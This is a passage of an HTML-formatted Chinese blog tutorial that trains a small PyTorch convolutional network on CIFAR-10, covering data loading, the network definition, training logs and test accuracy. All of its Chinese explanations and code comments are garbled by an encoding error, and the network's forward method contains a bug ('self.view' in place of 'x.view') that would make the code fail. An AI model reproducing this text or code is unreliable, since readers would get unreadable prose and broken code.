class="hljs-string">&#x27;./data&#x27;</span>, train=<span class="hljs-literal">False</span>, download=<span class="hljs-literal">True</span>, transform=transform)<br><br>testloader = torch.utils.data.DataLoader(testset, batch_size=<span class="hljs-number">4</span>, shuffle=<span class="hljs-literal">False</span>, num_workers=<span class="hljs-number">2</span>)<br><br>classes = (<span class="hljs-string">&#x27;plane&#x27;</span>, <span class="hljs-string">&#x27;automobile&#x27;</span>, <span class="hljs-string">&#x27;bird&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;deer&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;frog&#x27;</span>, <span class="hljs-string">&#x27;horse&#x27;</span>, <span class="hljs-string">&#x27;ship&#x27;</span>, <span class="hljs-string">&#x27;truck&#x27;</span>)<br></code></pre></td></tr></table></figure><p>å¯¹è¿™æ®µä»£ç çš„è§£é‡Šï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python">transform = transforms.Compose(<br>    [transforms.ToTensor(),<br>     transforms.Normalize((<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>), (<span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>, <span class="hljs-number">0.5</span>))])<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªæ•°æ®è½¬æ¢ç®¡é“ï¼Œä½¿ç”¨ <em>transforms.Compose()ã€‚</em></p><p>å®ƒæŒ‰é¡ºåºåº”ç”¨ä¸¤ä¸ªè½¬æ¢åˆ°è¾“å…¥å›¾åƒï¼š</p><ul><li>transforms.ToTensor(): å°†PILå›¾åƒæˆ–numpy.ndarrayè½¬æ¢ä¸ºPyTorchå¼ é‡ã€‚å›¾åƒæ•°æ®è¢«è½¬æ¢ä¸ºå¼ é‡å¹¶æ ‡å‡†åŒ–åˆ°èŒƒå›´[0, 1]ã€‚</li><li>transforms.Normalize((0.5, 0.5, 0.5), (0.5, 0.5, 0.5)): ä½¿ç”¨å‡å€¼å’Œæ ‡å‡†å·®å¯¹å¼ é‡å›¾åƒè¿›è¡Œå½’ä¸€åŒ–ã€‚è¿™å°†ä½¿ç”¨æ¯ä¸ªé€šé“ï¼ˆRã€Gã€Bï¼‰çš„å‡å€¼å’Œæ ‡å‡†å·®å€¼ï¼ˆ0.5ã€0.5ã€0.5ï¼‰å¯¹å›¾åƒå¼ é‡è¿›è¡Œå½’ä¸€åŒ–ã€‚å½’ä¸€åŒ–å…¬å¼ä¸º $\frac{(input - mean)}{std}$</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">trainset = torchvision.datasets.CIFAR10(root=<span class="hljs-string">&#x27;./data&#x27;</span>, train=<span class="hljs-literal">True</span>, download=<span class="hljs-literal">True</span>, transform=transform)<br></code></pre></td></tr></table></figure><p>ä½¿ç”¨torchvisionä¸­çš„CIFAR-10æ•°æ®é›†åˆ›å»ºä¸€ä¸ªè®­ç»ƒæ•°æ®é›†å¯¹è±¡ï¼ˆtrainsetï¼‰ã€‚å®ƒæŒ‡å®šäº†ä»¥ä¸‹å‚æ•°ï¼š</p><ul><li>root&#x3D;â€™.&#x2F;dataâ€™: æŒ‡å®šæ•°æ®é›†å°†è¢«å­˜å‚¨çš„ç›®å½•ã€‚</li><li>train&#x3D;True: è¡¨ç¤ºè¿™æ˜¯è®­ç»ƒé›†ã€‚</li><li>download&#x3D;True: å¦‚æœæ•°æ®é›†å°šæœªä¸‹è½½ï¼Œåˆ™ä¸‹è½½æ•°æ®é›†ã€‚</li><li>transform&#x3D;transform: å¯¹æ•°æ®é›†åº”ç”¨å‰é¢å®šä¹‰çš„è½¬æ¢ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">trainloader = torch.utils.data.DataLoader(trainset, batch_size=<span class="hljs-number">4</span>, shuffle=<span class="hljs-literal">True</span>, num_workers=<span class="hljs-number">2</span>)<br></code></pre></td></tr></table></figure><p>åˆ›å»ºä¸€ä¸ªç”¨äºè®­ç»ƒæ•°æ®é›†çš„æ•°æ®åŠ è½½å™¨ï¼ˆtrainloaderï¼‰ã€‚å®ƒæŒ‡å®šäº†ä»¥ä¸‹å‚æ•°ï¼š</p><ul><li>trainset: è¦åŠ è½½çš„æ•°æ®é›†å¯¹è±¡ã€‚</li><li>batch_size&#x3D;4: å°†æ‰¹æ¬¡å¤§å°è®¾ç½®ä¸º4ï¼Œè¿™æ„å‘³ç€åœ¨è®­ç»ƒæœŸé—´æ¯æ¬¡åŠ è½½4å¼ å›¾åƒã€‚</li><li>shuffle&#x3D;True: åœ¨æ¯ä¸ªepochä¹‹å‰å¯¹æ•°æ®è¿›è¡Œæ´—ç‰Œï¼Œä»¥å¼•å…¥éšæœºæ€§å¹¶é¿å…æ¨¡å‹å­¦ä¹ æ•°æ®çš„é¡ºåºã€‚</li><li>num_workers&#x3D;2: ç”¨äºæ•°æ®åŠ è½½çš„<strong>å­è¿›ç¨‹æ•°</strong>ã€‚åœ¨è¿™é‡Œï¼Œå°†ä½¿ç”¨2ä¸ªå­è¿›ç¨‹åŠ è½½æ•°æ®ã€‚</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">classes = (<span class="hljs-string">&#x27;plane&#x27;</span>, <span class="hljs-string">&#x27;automobile&#x27;</span>, <span class="hljs-string">&#x27;bird&#x27;</span>, <span class="hljs-string">&#x27;cat&#x27;</span>, <span class="hljs-string">&#x27;deer&#x27;</span>, <span class="hljs-string">&#x27;dog&#x27;</span>, <span class="hljs-string">&#x27;frog&#x27;</span>, <span class="hljs-string">&#x27;horse&#x27;</span>, <span class="hljs-string">&#x27;ship&#x27;</span>, <span class="hljs-string">&#x27;truck&#x27;</span>)<br></code></pre></td></tr></table></figure><p>æ­¤è¡Œå®šä¹‰äº†ä¸CIFAR-10æ•°æ®é›†ä¸­çš„10ä¸ªç±»åˆ«ç›¸å¯¹åº”çš„ç±»æ ‡ç­¾ã€‚ç¨åå°†ä½¿ç”¨è¿™äº›æ ‡ç­¾è¿›è¡Œé¢„æµ‹å’Œè¯„ä¼°ã€‚</p><h2 id="å®šä¹‰å·ç§¯ç¥ç»ç½‘ç»œ"><a href="#å®šä¹‰å·ç§¯ç¥ç»ç½‘ç»œ" class="headerlink" title="å®šä¹‰å·ç§¯ç¥ç»ç½‘ç»œ"></a>å®šä¹‰å·ç§¯ç¥ç»ç½‘ç»œ</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">import</span> torch<br><span class="hljs-keyword">import</span> torch.nn <span class="hljs-keyword">as</span> nn<br><span class="hljs-keyword">import</span> torch.nn.functional <span class="hljs-keyword">as</span> F<br><br><span class="hljs-comment"># å®šä¹‰å·ç§¯ç¥ç»ç½‘ç»œ</span><br><span class="hljs-keyword">class</span> <span class="hljs-title class_">Net</span>(nn.Module):<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">__init__</span>(<span class="hljs-params">self</span>):<br>        <span class="hljs-built_in">super</span>(Net, self).__init__()<br>        self.conv1 = nn.Conv2d(<span class="hljs-number">3</span>, <span class="hljs-number">6</span>, <span class="hljs-number">5</span>)<br>        self.pool = nn.MaxPool2d(<span class="hljs-number">2</span>, <span class="hljs-number">2</span>)<br>        self.conv2 = nn.Conv2d(<span class="hljs-number">6</span>, <span class="hljs-number">16</span>, <span class="hljs-number">5</span>)<br>        self.fc1 = nn.Linear(<span class="hljs-number">16</span>*<span class="hljs-number">5</span>*<span class="hljs-number">5</span>, <span class="hljs-number">120</span>)<br>        self.fc2 = nn.Linear(<span class="hljs-number">120</span>, <span class="hljs-number">84</span>)<br>        self.fc3 = nn.Linear(<span class="hljs-number">84</span>, <span class="hljs-number">10</span>)<br><br>    <span class="hljs-keyword">def</span> <span class="hljs-title function_">forward</span>(<span class="hljs-params">self, x</span>):<br>        x = self.pool(F.relu(self.conv1(x)))<br>        x = self.pool(F.relu(self.conv2(x)))<br>        x = self.view(-<span class="hljs-number">1</span>, <span class="hljs-number">16</span>*<span class="hljs-number">5</span>*<span class="hljs-number">5</span>)<br>        x = F.relu(self.fc1(x))<br>        x = F.relu(self.fc2(x))<br>        x = self.fc3(x)<br>        <span class="hljs-keyword">return</span> x<br></code></pre></td></tr></table></figure><h3 id="ä¸€äº›æ³¨é‡Š"><a href="#ä¸€äº›æ³¨é‡Š" class="headerlink" title="ä¸€äº›æ³¨é‡Š"></a>ä¸€äº›æ³¨é‡Š</h3><p>å¯¹äº <strong>init</strong> å‡½æ•°ï¼š</p><ul><li>ç¬¬ä¸€ä¸ªå·ç§¯å±‚ self.conv1 è¾“å…¥é€šé“æ•°ä¸º3ï¼ˆå› ä¸ºè¾“å…¥å›¾åƒæœ‰3ä¸ªé€šé“ï¼Œé€šå¸¸ä¸ºRGBï¼‰ï¼Œè¾“å‡ºé€šé“æ•°ä¸º6ï¼Œå·ç§¯æ ¸å¤§å°ä¸º5x5ã€‚</li><li>ç¬¬ä¸€ä¸ªæœ€å¤§æ± åŒ–å±‚ self.pool ä½¿ç”¨2x2çš„æ± åŒ–çª—å£è¿›è¡Œæ± åŒ–æ“ä½œï¼Œæ­¥é•¿ä¸º2ã€‚</li><li>ç¬¬äºŒä¸ªå·ç§¯å±‚ self.conv2 è¾“å…¥é€šé“æ•°ä¸º6ï¼ˆå³ç¬¬ä¸€ä¸ªå·ç§¯å±‚çš„è¾“å‡ºé€šé“æ•°ï¼‰ï¼Œè¾“å‡ºé€šé“æ•°ä¸º16ï¼Œå·ç§¯æ ¸å¤§å°ä¸º5x5ã€‚</li><li>ç¬¬ä¸€ä¸ªå…¨è¿æ¥å±‚ self.fc1 çš„è¾“å…¥å¤§å°ä¸º16x5x5ï¼Œè¾“å‡ºå¤§å°ä¸º120ã€‚</li><li>ç¬¬äºŒä¸ªå…¨è¿æ¥å±‚ self.fc2 çš„è¾“å…¥å¤§å°ä¸º120ï¼Œè¾“å‡ºå¤§å°ä¸º84ã€‚</li><li>ç¬¬ä¸‰ä¸ªå…¨è¿æ¥å±‚ self.fc3 çš„è¾“å…¥å¤§å°ä¸º84ï¼Œè¾“å‡ºå¤§å°ä¸º10ï¼ˆå› ä¸ºé€šå¸¸åœ¨åˆ†ç±»é—®é¢˜ä¸­ï¼Œè¾“å‡ºå±‚çš„å¤§å°å¯¹åº”ç€ç±»åˆ«çš„æ•°é‡ï¼‰ã€‚</li></ul><p>å¯¹äº forward å‡½æ•°ï¼š</p><ul><li>é¦–å…ˆå°†è¾“å…¥å¼ é‡ x ä¼ é€’ç»™ç¬¬ä¸€ä¸ªå·ç§¯å±‚ self.conv1ï¼Œç„¶ååº”ç”¨ ReLU æ¿€æ´»å‡½æ•°ï¼Œå¹¶é€šè¿‡æœ€å¤§æ± åŒ–å±‚ self.pool è¿›è¡Œæ± åŒ–æ“ä½œã€‚</li><li>æ¥ç€å°†ç»è¿‡ç¬¬ä¸€ä¸ªæ± åŒ–å±‚å¤„ç†åçš„æ•°æ®ä¼ é€’ç»™ç¬¬äºŒä¸ªå·ç§¯å±‚ self.conv2ï¼Œç„¶åå†æ¬¡åº”ç”¨ ReLU æ¿€æ´»å‡½æ•°ï¼Œå¹¶å†æ¬¡é€šè¿‡æœ€å¤§æ± åŒ–å±‚è¿›è¡Œæ± åŒ–æ“ä½œã€‚</li><li>å°†ç»è¿‡ä¸¤ä¸ªå·ç§¯å±‚å’Œæ± åŒ–å±‚å¤„ç†åçš„æ•°æ® x å±•å¹³ä¸ºä¸€ç»´å¼ é‡ã€‚</li><li>å°†å±•å¹³åçš„æ•°æ®ä¼ é€’ç»™ç¬¬ä¸€ä¸ªå…¨è¿æ¥å±‚ self.fc1ï¼Œå¹¶åº”ç”¨ ReLU æ¿€æ´»å‡½æ•°ã€‚</li><li>å°†ç¬¬ä¸€ä¸ªå…¨è¿æ¥å±‚çš„è¾“å‡ºä¼ é€’ç»™ç¬¬äºŒä¸ªå…¨è¿æ¥å±‚ self.fc2ï¼Œå†æ¬¡åº”ç”¨ ReLU æ¿€æ´»å‡½æ•°ã€‚</li><li>æœ€åå°†ç¬¬äºŒä¸ªå…¨è¿æ¥å±‚çš„è¾“å‡ºä¼ é€’ç»™è¾“å‡ºå±‚</li></ul><h2 id="å®šä¹‰æŸå¤±å‡½æ•°"><a href="#å®šä¹‰æŸå¤±å‡½æ•°" class="headerlink" title="å®šä¹‰æŸå¤±å‡½æ•°"></a>å®šä¹‰æŸå¤±å‡½æ•°</h2><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å®šä¹‰æŸå¤±å‡½æ•°</span><br>criterion = nn.CrossEntropyLoss()<br>optimizer = optim.SGD(net.parameters(), lr=<span class="hljs-number">0.001</span>, momentum=<span class="hljs-number">0.9</span>)<br></code></pre></td></tr></table></figure><p>é‡‡ç”¨äº¤å‰ç†µæŸå¤±å‡½æ•°å’Œæ¢¯åº¦ä¸‹é™ç®—æ³•ã€‚</p><h2 id="è®­ç»ƒæ¨¡å‹"><a href="#è®­ç»ƒæ¨¡å‹" class="headerlink" title="è®­ç»ƒæ¨¡å‹"></a>è®­ç»ƒæ¨¡å‹</h2><ul><li>é‡‡ç”¨æ¢¯åº¦ä¸‹é™çš„ä¼˜åŒ–ç®—æ³•ï¼Œéƒ½éœ€è¦å¾ˆå¤šä¸ªè½®æ¬¡çš„è¿­ä»£è®­ç»ƒ</li></ul><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># åœ¨è®­ç»ƒé›†ä¸Šè®­ç»ƒæ¨¡å‹</span><br>    <span class="hljs-keyword">for</span> epoch <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">2</span>):    <span class="hljs-comment"># éå†ä¸¤éæ•°æ®é›†</span><br>        running_loss = <span class="hljs-number">0.0</span><br>        <span class="hljs-keyword">for</span> i, data <span class="hljs-keyword">in</span> <span class="hljs-built_in">enumerate</span>(trainloader, <span class="hljs-number">0</span>):<br>            <span class="hljs-comment"># dataä¸­åŒ…å«è¾“å…¥å›¾åƒå¼ é‡inputsï¼Œæ ‡ç­¾å¼ é‡labels</span><br>            inputs, labels = data<br>            <span class="hljs-comment"># æ¢¯åº¦å½’é›¶</span><br>            optimizer.zero_grad()<br>            <span class="hljs-comment"># è¾“å…¥å›¾åƒå¼ é‡è¿›ç½‘ç»œï¼Œå¾—åˆ°è¾“å‡ºå¼ é‡outputs</span><br>            outputs = net(inputs)<br>            <span class="hljs-comment"># åˆ©ç”¨ç½‘ç»œçš„è¾“å‡ºoutputå’Œæ ‡ç­¾labelsè®¡ç®—æŸå¤±å€¼</span><br>            loss = criterion(outputs, labels)<br>            <span class="hljs-comment"># åå‘ä¼ æ’­+å‚æ•°æ›´æ–°</span><br>            loss.backward()<br>            optimizer.step()<br>            <span class="hljs-comment"># æ‰“å°è½®æ¬¡å’ŒæŸå¤±å€¼</span><br>            running_loss += loss.item()<br>            <span class="hljs-keyword">if</span> (i + <span class="hljs-number">1</span>) % <span class="hljs-number">2000</span> == <span class="hljs-number">0</span>:<br>                <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;[%d, %5d] loss: %.3f&#x27;</span> % (epoch + <span class="hljs-number">1</span>, i + <span class="hljs-number">1</span>, running_loss / <span class="hljs-number">2000</span>))<br>                running_loss = <span class="hljs-number">0.0</span><br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Finished Training&#x27;</span>)<br>    <span class="hljs-comment"># ä¿å­˜æ¨¡å‹</span><br>    PATH = <span class="hljs-string">&#x27;./cifar10_net.pth&#x27;</span><br>    torch.save(net.state_dict(), PATH)<br></code></pre></td></tr></table></figure><p>è®­ç»ƒç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-string">&#x27;&#x27;&#x27;</span><br><span class="hljs-string">[1,  2000] loss: 2.235</span><br><span class="hljs-string">[1,  4000] loss: 1.860</span><br><span class="hljs-string">[1,  6000] loss: 1.651</span><br><span class="hljs-string">[1,  8000] loss: 1.573</span><br><span class="hljs-string">[1, 10000] loss: 1.513</span><br><span class="hljs-string">[1, 12000] loss: 1.477</span><br><span class="hljs-string">[2,  2000] loss: 1.395</span><br><span class="hljs-string">[2,  4000] loss: 1.369</span><br><span class="hljs-string">[2,  6000] loss: 1.333</span><br><span class="hljs-string">[2,  8000] loss: 1.325</span><br><span class="hljs-string">[2, 10000] loss: 1.311</span><br><span class="hljs-string">[2, 12000] loss: 1.295</span><br><span class="hljs-string">Finished Training</span><br><span class="hljs-string">&#x27;&#x27;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="åœ¨æµ‹è¯•é›†ä¸Šæµ‹è¯•æ¨¡å‹"><a href="#åœ¨æµ‹è¯•é›†ä¸Šæµ‹è¯•æ¨¡å‹" class="headerlink" title="åœ¨æµ‹è¯•é›†ä¸Šæµ‹è¯•æ¨¡å‹"></a>åœ¨æµ‹è¯•é›†ä¸Šæµ‹è¯•æ¨¡å‹</h2><h3 id="ç¬¬ä¸€æ­¥ï¼Œå±•ç¤ºæµ‹è¯•é›†ä¸­çš„è‹¥å¹²å›¾ç‰‡"><a href="#ç¬¬ä¸€æ­¥ï¼Œå±•ç¤ºæµ‹è¯•é›†ä¸­çš„è‹¥å¹²å›¾ç‰‡" class="headerlink" title="ç¬¬ä¸€æ­¥ï¼Œå±•ç¤ºæµ‹è¯•é›†ä¸­çš„è‹¥å¹²å›¾ç‰‡"></a>ç¬¬ä¸€æ­¥ï¼Œå±•ç¤ºæµ‹è¯•é›†ä¸­çš„è‹¥å¹²å›¾ç‰‡</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># å±•ç¤ºå›¾ç‰‡</span><br>dataiter = <span class="hljs-built_in">iter</span>(testloader)<br>images, labels = dataiter.<span class="hljs-built_in">next</span>()<br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">imshow</span>(<span class="hljs-params">img</span>):<br>    img = img / <span class="hljs-number">2</span> + <span class="hljs-number">0.5</span><br>    npimg = img.numpy()<br>    plt.imshow(np.transpose(npimg, (<span class="hljs-number">1</span>, <span class="hljs-number">2</span>, <span class="hljs-number">0</span>)))<br>    plt.show()<br><br><span class="hljs-comment"># æ‰“å°åŸå§‹å›¾ç‰‡</span><br>imshow(torchvision.utils.make_grid(images))<br><span class="hljs-comment"># æ‰“å°çœŸå®æ ‡ç­¾</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;GroundTruth: &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-string">&#x27;%5s&#x27;</span> % classes[labels[j]] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)))<br></code></pre></td></tr></table></figure><p>ä»£ç è§£è¯»ï¼š</p><ul><li><p>dataiter &#x3D; iter(testloader): åˆ›å»ºäº†ä¸€ä¸ªè¿­ä»£å™¨ dataiterï¼Œç”¨äºè¿­ä»£æµ‹è¯•æ•°æ®åŠ è½½å™¨ testloaderï¼Œä»¥ä¾¿é€æ‰¹è·å–æµ‹è¯•æ•°æ®ã€‚</p></li><li><p>images, labels &#x3D; next(dataiter): ä½¿ç”¨ next() å‡½æ•°ä» dataiter ä¸­è·å–ä¸‹ä¸€æ‰¹æµ‹è¯•æ•°æ®ï¼Œå…¶ä¸­ images æ˜¯ä¸€ä¸ªåŒ…å«äº†ä¸€æ‰¹å›¾åƒçš„å¼ é‡ï¼Œlabels æ˜¯è¿™æ‰¹å›¾åƒå¯¹åº”çš„çœŸå®æ ‡ç­¾ã€‚</p></li><li><p>def imshow(img): å®šä¹‰äº†ä¸€ä¸ªå‡½æ•° imshowï¼Œç”¨äºå±•ç¤ºå›¾åƒã€‚</p></li><li><p>img &#x3D; img &#x2F; 2 + 0.5: å¯¹è¾“å…¥çš„å›¾åƒæ•°æ®è¿›è¡Œå¤„ç†ï¼Œå°†å…¶ä»æ ‡å‡†åŒ–åçš„å¼ é‡æ ¼å¼è½¬æ¢å›åŸå§‹å›¾åƒçš„åƒç´ å€¼èŒƒå›´ï¼Œå³ä» [-1, 1] è½¬æ¢ä¸º [0, 1]ã€‚</p></li><li><p>npimg &#x3D; img.numpy(): å°†å¼ é‡ç±»å‹çš„å›¾åƒæ•°æ®è½¬æ¢ä¸º NumPy æ•°ç»„ï¼Œå› ä¸º matplotlib åº“æ¥å—çš„æ˜¯ NumPy æ•°ç»„æ ¼å¼çš„å›¾åƒæ•°æ®ã€‚</p></li><li><p>plt.imshow(np.transpose(npimg, (1, 2, 0))): ä½¿ç”¨ imshow å‡½æ•°å±•ç¤ºå›¾åƒã€‚</p></li></ul><p>(1, 2, 0): è¿™æ˜¯ä¸€ä¸ªå…ƒç»„ï¼ŒæŒ‡å®šäº†æ•°ç»„çš„ç»´åº¦é¡ºåºã€‚åœ¨è¿™ä¸ªå…ƒç»„ä¸­ï¼Œæ¯ä¸ªæ•°å­—è¡¨ç¤ºäº†åŸå§‹æ•°ç»„çš„ä¸€ä¸ªç»´åº¦åœ¨æ–°æ•°ç»„ä¸­çš„ä½ç½®ã€‚å› æ­¤ï¼Œ(1, 2, 0) æ„å‘³ç€å°†åŸå§‹æ•°ç»„çš„ç¬¬ 1 ç»´ç§»åŠ¨åˆ°æ–°æ•°ç»„çš„ç¬¬ 0 ä¸ªä½ç½®ï¼Œç¬¬ 2 ç»´ç§»åŠ¨åˆ°æ–°æ•°ç»„çš„ç¬¬ 1 ä¸ªä½ç½®ï¼ŒåŸå§‹æ•°ç»„çš„ç¬¬ 0 ç»´ç§»åŠ¨åˆ°æ–°æ•°ç»„çš„ç¬¬ 2 ä¸ªä½ç½®ã€‚</p><p>åœ¨å›¾åƒå¤„ç†ä¸­ï¼Œä¸€èˆ¬å›¾åƒæ•°ç»„çš„ç»´åº¦é¡ºåºæ˜¯ (é€šé“æ•°, é«˜åº¦, å®½åº¦)ï¼Œå³ (channels, height, width)ï¼Œå…¶ä¸­ channels è¡¨ç¤ºå›¾åƒçš„é€šé“æ•°ï¼Œæ¯”å¦‚ RGB å›¾åƒä¸­é€šå¸¸æ˜¯ 3ã€‚è€Œ imshow å‡½æ•°é»˜è®¤ä¼šå°†æœ€åä¸€ä¸ªç»´åº¦è§†ä¸ºé€šé“ç»´åº¦ï¼Œæ‰€ä»¥éœ€è¦ç”¨ np.transpose() æ¥è°ƒæ•´æ•°ç»„çš„ç»´åº¦é¡ºåºä»¥åŒ¹é… imshow çš„é¢„æœŸè¾“å…¥æ ¼å¼ï¼Œå³ (height, width, channels)ã€‚</p><ul><li><p>plt.show(): æ˜¾ç¤ºå›¾åƒã€‚</p></li><li><p>imshow(torchvision.utils.make_grid(images)): è°ƒç”¨ imshow å‡½æ•°ï¼Œå°†ä¸€æ‰¹å›¾åƒç»„åˆæˆä¸€ä¸ªç½‘æ ¼å¹¶å±•ç¤ºå‡ºæ¥ã€‚</p></li><li><p>print(â€˜GroundTruth: â€˜, â€˜ â€˜.join(â€˜%5sâ€™ % classes[labels[j]] for j in range(4))): æ‰“å°å‡ºè¿™æ‰¹å›¾åƒå¯¹åº”çš„çœŸå®æ ‡ç­¾ã€‚ä½¿ç”¨äº†åˆ—è¡¨æ¨å¯¼å¼ï¼Œå°†æ¯ä¸ªå›¾åƒçš„çœŸå®æ ‡ç­¾è½¬æ¢ä¸ºå¯¹åº”çš„ç±»åˆ«åç§°ï¼Œå¹¶ä½¿ç”¨ç©ºæ ¼è¿æ¥èµ·æ¥ï¼Œæœ€åæ‰“å°å‡ºæ¥ã€‚</p></li></ul><p>è¾“å‡ºç»“æœï¼š<br><img src="/Pictures/DL/CNN/plot04.png" alt="img"></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs python">GroundTruth:    cat  ship  ship plane<br></code></pre></td></tr></table></figure><h3 id="ç¬¬äºŒæ­¥ï¼ŒåŠ è½½æ¨¡å‹å¯¹æµ‹è¯•å›¾ç‰‡è¿›è¡Œé¢„æµ‹"><a href="#ç¬¬äºŒæ­¥ï¼ŒåŠ è½½æ¨¡å‹å¯¹æµ‹è¯•å›¾ç‰‡è¿›è¡Œé¢„æµ‹" class="headerlink" title="ç¬¬äºŒæ­¥ï¼ŒåŠ è½½æ¨¡å‹å¯¹æµ‹è¯•å›¾ç‰‡è¿›è¡Œé¢„æµ‹"></a>ç¬¬äºŒæ­¥ï¼ŒåŠ è½½æ¨¡å‹å¯¹æµ‹è¯•å›¾ç‰‡è¿›è¡Œé¢„æµ‹</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs python">net = Net()<br><span class="hljs-comment"># åŠ è½½ä¿å­˜çš„çŠ¶æ€å­—å…¸</span><br>net.load_state_dict(torch.load(PATH))<br><span class="hljs-comment"># è¿›è¡Œé¢„æµ‹</span><br>outputs = net(images)<br><span class="hljs-comment"># é‡‡ç”¨è®¡ç®—å‡ºæ¦‚ç‡æœ€å¤§çš„ä¸ºç±»åˆ«</span><br>_, predicted = torch.<span class="hljs-built_in">max</span>(outputs, <span class="hljs-number">1</span>)<br><span class="hljs-comment"># æ‰“å°ç»“æœ</span><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Prediced: &#x27;</span>, <span class="hljs-string">&#x27; &#x27;</span>.join(<span class="hljs-string">&#x27;%5s&#x27;</span> % classes[predicted[j]] <span class="hljs-keyword">for</span> j <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">4</span>)))<br></code></pre></td></tr></table></figure><p>è¿è¡Œç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs python">GroundTruth:    cat  ship  ship plane<br>Prediced:    cat automobile plane plane<br></code></pre></td></tr></table></figure><p>ç¨æœ‰è¯¯å·®ã€‚ã€‚ã€‚åŠ å¤§epochï¼</p><p>å…¨éƒ¨æµ‹è¯•é›†ç»“æœï¼š</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-comment"># è·‘ä¸€éå…¨éƒ¨æµ‹è¯•é›†</span><br>correct = <span class="hljs-number">0</span><br>total = <span class="hljs-number">0</span><br><span class="hljs-keyword">with</span> torch.no_grad():<br>    <span class="hljs-keyword">for</span> data <span class="hljs-keyword">in</span> testloader:<br>        images, labels = data<br>        outputs = net(images)<br>        _, predicted = torch.<span class="hljs-built_in">max</span>(outputs.data, <span class="hljs-number">1</span>)<br>        total += labels.size(<span class="hljs-number">0</span>)<br>        correct += (predicted == labels).<span class="hljs-built_in">sum</span>().item()<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">&#x27;Accuracy: %d %%&#x27;</span> % (<span class="hljs-number">100</span> * correct / total))<br></code></pre></td></tr></table></figure><figure class="highlight apache"><table><tr><td class="gutter"><pre><span 